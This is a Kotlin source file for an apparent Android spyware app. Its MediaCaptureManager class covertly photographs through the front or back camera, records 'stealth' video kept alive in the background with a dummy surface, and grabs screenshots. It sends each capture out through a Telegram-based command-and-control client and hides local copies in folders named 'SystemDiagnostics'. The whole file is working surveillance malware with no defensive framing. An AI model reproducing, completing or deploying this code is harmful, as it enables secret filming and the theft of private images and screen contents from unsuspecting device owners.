package com.mzkyzak.appbug

import android.annotation.SuppressLint
import android.content.ContentValues
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.*
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaRecorder
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.provider.MediaStore
import android.util.DisplayMetrics
import android.util.Log
import android.view.Surface
import android.view.WindowManager
import java.io.ByteArrayOutputStream
import java.io.File

class MediaCaptureManager(private val context: Context, private val c2Client: TelegramC2Client) {
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null

    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var cameraImageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    private var mediaRecorder: MediaRecorder? = null
    private var videoOutputFile: String = ""
    private var dummySurfaceTexture: SurfaceTexture? = null
    private var dummySurface: Surface? = null
    private var isRecordingVideo = false
    private val mainHandler = Handler(Looper.getMainLooper())

    fun captureScreen(projectionData: Intent) {
        val mpManager = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = mpManager.getMediaProjection(-1, projectionData)

        val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        windowManager.defaultDisplay.getRealMetrics(metrics)
        
        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenCapture",
            width, height, density,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface,
            null,
            null
        )

        mainHandler.postDelayed({
            tryTakingScreenshot(width, height, 0)
        }, 1500)
    }

    @SuppressLint("MissingPermission")
    fun captureCovertPhoto(front: Boolean = false) {
        if (isRecordingVideo) return
        stopCamera()
        
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val facing = if (front) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
            val targetId = manager.cameraIdList.firstOrNull { id ->
                val chars = manager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == facing
            } ?: manager.cameraIdList[0]

            startBackgroundThread()
            cameraImageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 2)
            cameraImageReader?.setOnImageAvailableListener({ reader ->
                val image = try { reader.acquireLatestImage() } catch (e: Exception) { null }
                if (image != null) {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    val label = if (front) "front" else "back"
                    saveToLocalGallery(bytes, "${label}_shot_${System.currentTimeMillis()}.jpg", false)
                    c2Client.sendDocument("${label}_shot_${System.currentTimeMillis()}.jpg", bytes)
                    image.close()
                }
                stopCamera()
            }, backgroundHandler)

            manager.openCamera(targetId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    takeStillPicture()
                }
                override fun onDisconnected(camera: CameraDevice) { stopCamera() }
                override fun onError(camera: CameraDevice, error: Int) { stopCamera() }
            }, backgroundHandler)
        } catch (e: Exception) {
            c2Client.sendMessage("<b>[Visuals]</b> Camera Photo Error: ${e.message}")
            stopCamera()
        }
    }

    private fun takeStillPicture() {
        try {
            val captureBuilder = cameraDevice?.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
            captureBuilder?.addTarget(cameraImageReader!!.surface)

            // FIX: Prevent "white/high contrast" blowout
            captureBuilder?.set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
            captureBuilder?.set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
            captureBuilder?.set(CaptureRequest.CONTROL_AWB_MODE, CaptureRequest.CONTROL_AWB_MODE_AUTO)

            @Suppress("DEPRECATION")
            cameraDevice?.createCaptureSession(listOf(cameraImageReader!!.surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    try {
                        // Hardening: Mandatory delay to let AE/AWB settle
                        backgroundHandler?.postDelayed({
                            try {
                                captureSession?.capture(captureBuilder!!.build(), null, backgroundHandler)
                            } catch (e: Exception) { stopCamera() }
                        }, 800)
                    } catch (e: Exception) { stopCamera() }
                }
                override fun onConfigureFailed(session: CameraCaptureSession) { stopCamera() }
            }, backgroundHandler)
        } catch (e: Exception) { stopCamera() }
    }

    @SuppressLint("MissingPermission")
    fun recordStealthVideo(durationMs: Long = 30000, front: Boolean = false) {
        if (isRecordingVideo) {
            c2Client.sendMessage("<b>[Visuals]</b> REC Session Busy.")
            return
        }
        stopCamera()
        
        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val facing = if (front) CameraCharacteristics.LENS_FACING_FRONT else CameraCharacteristics.LENS_FACING_BACK
            val targetId = manager.cameraIdList.firstOrNull { id ->
                val chars = manager.getCameraCharacteristics(id)
                chars.get(CameraCharacteristics.LENS_FACING) == facing
            } ?: manager.cameraIdList[0]

            videoOutputFile = "${context.cacheDir.absolutePath}/vid_${System.currentTimeMillis()}.mp4"
            startBackgroundThread()
            
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(context)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            manager.openCamera(targetId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    setupHardenedVideoRecorder(durationMs, front)
                }
                override fun onDisconnected(camera: CameraDevice) { stopVideoRecording() }
                override fun onError(camera: CameraDevice, error: Int) { stopVideoRecording() }
            }, backgroundHandler)

        } catch (e: Exception) {
            c2Client.sendMessage("<b>[Visuals]</b> Master Error: ${e.message}")
        }
    }

    private fun setupHardenedVideoRecorder(durationMs: Long, front: Boolean) {
        try {
            mediaRecorder?.apply {
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setOutputFile(videoOutputFile)
                setVideoSize(1280, 720)
                setVideoFrameRate(30)
                setVideoEncodingBitRate(4000000)
                prepare()
            }

            val recorderSurface = mediaRecorder!!.surface
            // HARDENING: Add a dummy surface to keep the camera session alive in background
            dummySurfaceTexture = SurfaceTexture(10).apply { setDefaultBufferSize(640, 480) }
            dummySurface = Surface(dummySurfaceTexture)

            val builder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
            builder.addTarget(recorderSurface)
            builder.addTarget(dummySurface!!)

            @Suppress("DEPRECATION")
            cameraDevice!!.createCaptureSession(listOf(recorderSurface, dummySurface!!), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    try {
                        builder.set(CaptureRequest.CONTROL_MODE, CameraMetadata.CONTROL_MODE_AUTO)
                        session.setRepeatingRequest(builder.build(), null, backgroundHandler)
                        mediaRecorder!!.start()
                        isRecordingVideo = true
                        c2Client.sendMessage("<b>[Video]</b> 30s Record Active (${if (front) "Front" else "Back"})")
                        mainHandler.postDelayed({ stopVideoRecording() }, durationMs)
                    } catch (e: Exception) {
                        c2Client.sendMessage("<b>[Video]</b> Start fail: ${e.message}")
                        stopVideoRecording()
                    }
                }
                override fun onConfigureFailed(session: CameraCaptureSession) {
                    c2Client.sendMessage("<b>[Video]</b> Config fail")
                    stopVideoRecording()
                }
            }, backgroundHandler)

        } catch (e: Exception) {
            c2Client.sendMessage("<b>[Video]</b> Setup fail: ${e.message}")
            stopVideoRecording()
        }
    }

    private fun stopVideoRecording() {
        if (!isRecordingVideo) return
        isRecordingVideo = false

        try {
            mediaRecorder?.apply {
                try { stop() } catch (e: Exception) {}
                release()
            }
            mediaRecorder = null
            
            stopCamera()
            dummySurface?.release()
            dummySurface = null
            dummySurfaceTexture?.release()
            dummySurfaceTexture = null

            mainHandler.postDelayed({
                if (videoOutputFile.isNotEmpty()) {
                    val file = File(videoOutputFile)
                    if (file.exists() && file.length() > 50000) {
                        val bytes = file.readBytes()
                        saveToLocalGallery(bytes, "stealth_vid_${System.currentTimeMillis()}.mp4", true)
                        c2Client.sendDocument("stealth_vid_${System.currentTimeMillis()}.mp4", bytes)
                        c2Client.sendMessage("<b>[Video]</b> Exfil complete: ${bytes.size / 1024} KB")
                    } else {
                        val size = if (file.exists()) file.length() else 0
                        c2Client.sendMessage("<b>[Video]</b> Corrupt / too small: $size bytes")
                    }
                    mainHandler.postDelayed({ if (file.exists()) file.delete() }, 5000)
                    videoOutputFile = ""
                }
            }, 3000)
        } catch (e: Exception) {
            Log.e("MediaCapture", "Stop fail", e)
        }
    }

    fun startBrutalSequence(front: Boolean = false) {
        c2Client.sendMessage("<b>[Mata-mata]</b> Gaspol rekam 30 detik ya, boss man...")
        captureCovertPhoto(front)
        mainHandler.postDelayed({
            recordStealthVideo(30000, front)
        }, 8000)
    }

    fun startBrutalBurst(count: Int = 10, intervalMs: Long = 500) {
        var shotsTaken = 0
        val burstRunnable = object : Runnable {
            override fun run() {
                if (shotsTaken < count) {
                    captureCovertPhoto(false)
                    shotsTaken++
                    mainHandler.postDelayed(this, intervalMs)
                } else {
                    c2Client.sendMessage("<b>[Visuals]</b> Brutal burst complete.")
                }
            }
        }
        mainHandler.post(burstRunnable)
    }

    private fun saveToLocalGallery(bytes: ByteArray, fileName: String, isVideo: Boolean) {
        val collection = if (isVideo) MediaStore.Video.Media.EXTERNAL_CONTENT_URI else MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val folder = if (isVideo) "Movies/SystemDiagnostics" else "Pictures/SystemDiagnostics"
        
        val contentValues = ContentValues().apply {
            put(MediaStore.MediaColumns.DISPLAY_NAME, fileName)
            put(MediaStore.MediaColumns.MIME_TYPE, if (isVideo) "video/mp4" else "image/jpeg")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                put(MediaStore.MediaColumns.RELATIVE_PATH, folder)
                put(MediaStore.MediaColumns.IS_PENDING, 1)
            }
        }

        val uri = try { context.contentResolver.insert(collection, contentValues) } catch (e: Exception) { null }
        uri?.let {
            try {
                context.contentResolver.openOutputStream(it)?.use { stream ->
                    stream.write(bytes)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    contentValues.clear()
                    contentValues.put(MediaStore.MediaColumns.IS_PENDING, 0)
                    context.contentResolver.update(it, contentValues, null, null)
                }
            } catch (e: Exception) {}
        }
    }

    private fun startBackgroundThread() {
        if (backgroundThread == null) {
            backgroundThread = HandlerThread("CameraOps").also { it.start() }
            backgroundHandler = Handler(backgroundThread!!.looper)
        }
    }

    private fun stopCamera() {
        try {
            captureSession?.close()
            captureSession = null
            cameraDevice?.close()
            cameraDevice = null
            cameraImageReader?.close()
            cameraImageReader = null
            backgroundThread?.quitSafely()
            backgroundThread = null
        } catch (e: Exception) {}
    }

    private fun tryTakingScreenshot(width: Int, height: Int, retryCount: Int) {
        val image = try {
            imageReader?.acquireNextImage()
        } catch (e: Exception) {
            null
        }

        if (image != null) {
            processAndSend(image, width, height)
        } else if (retryCount < 10) {
            mainHandler.postDelayed({
                tryTakingScreenshot(width, height, retryCount + 1)
            }, 500)
        } else {
            c2Client.sendMessage("<b>[Visuals]</b> Error: No screen frame")
            stopProjection()
        }
    }

    private fun processAndSend(image: android.media.Image, width: Int, height: Int) {
        try {
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * width
            
            val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
            bitmap.copyPixelsFromBuffer(buffer)
            image.close()

            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 70, outputStream)
            val bytes = outputStream.toByteArray()
            saveToLocalGallery(bytes, "screen_spy_${System.currentTimeMillis()}.jpg", false)
            c2Client.sendDocument("screen_spy_${System.currentTimeMillis()}.jpg", bytes)
        } catch (e: Exception) {
            c2Client.sendMessage("<b>[Visuals]</b> Capture Error: ${e.message}")
        } finally {
            stopProjection()
        }
    }

    private fun stopProjection() {
        try {
            virtualDisplay?.release()
            virtualDisplay = null
            mediaProjection?.stop()
            mediaProjection = null
            imageReader?.close()
            imageReader = null
        } catch (e: Exception) {
            Log.e("MediaCapture", "Cleanup failed", e)
        }
    }
}
